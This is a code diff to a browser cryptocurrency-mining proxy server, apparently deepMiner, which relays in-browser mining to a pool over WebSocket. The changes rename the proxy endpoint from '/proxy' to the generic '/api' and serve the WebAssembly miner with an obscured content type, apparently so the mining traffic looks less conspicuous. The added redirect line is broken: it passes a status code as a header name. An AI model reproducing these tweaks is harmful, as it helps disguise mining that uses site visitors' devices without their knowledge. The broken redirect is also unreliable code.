@@ -26,9 +26,8 @@ const stats = (req, res) => {
     req.url = (req.url === '/') ? '/index.html' : req.url;
     fs.readFile(__dirname + '/web' + req.url, (err, buf) => {
         if (err) {
-            fs.readFile(__dirname + '/web/404.html', (err, buf) => {
-                res.end(buf);
-            });
+            res.setHeader(301, 'https://' + conf.domain);
+            res.end(buf);
         } else {
             if (!req.url.match(/\.wasm$/) && !req.url.match(/\.mem$/)) {
                 buf = buf.toString().replace(/%deepMiner_domain%/g, conf.domain);
@@ -36,7 +35,7 @@ const stats = (req, res) => {
                     res.setHeader('content-type', 'application/javascript');
                 }
             } else {
-                res.setHeader('Content-Type', 'application/wasm');
+                res.setHeader('Content-Type', 'application/octet-stream');
             }
             res.end(buf);
         }
@@ -56,7 +55,7 @@ if (ssl) {
 // Miner Proxy Srv
 var srv = new WebSocket.Server({
     server: web,
-    path: "/proxy",
+    path: "/api",
     maxPayload: 256
 });
 srv.on('connection', (ws) => {
@@ -178,7 +177,9 @@ srv.on('connection', (ws) => {
                 buf = JSON.stringify(buf);
                 conn.ws.send(buf);
             }
-        } catch (error) { console.warn('[!] Error: '+error.message) }
+        } catch (error) {
+            console.warn('[!] Error: ' + error.message)
+        }
     }
     conn.ws.on('message', (data) => {
         ws2pool(data);
@@ -192,7 +193,7 @@ srv.on('connection', (ws) => {
         console.log('[!] ' + conn.uid + ' offline.\n');
         conn.pl.destroy();
     });
-    conn.pl.on('data', function(data) {
+    conn.pl.on('data', function (data) {
         var linesdata = data;
         var lines = String(linesdata).split("\n");
         if (lines[1].length > 0) {
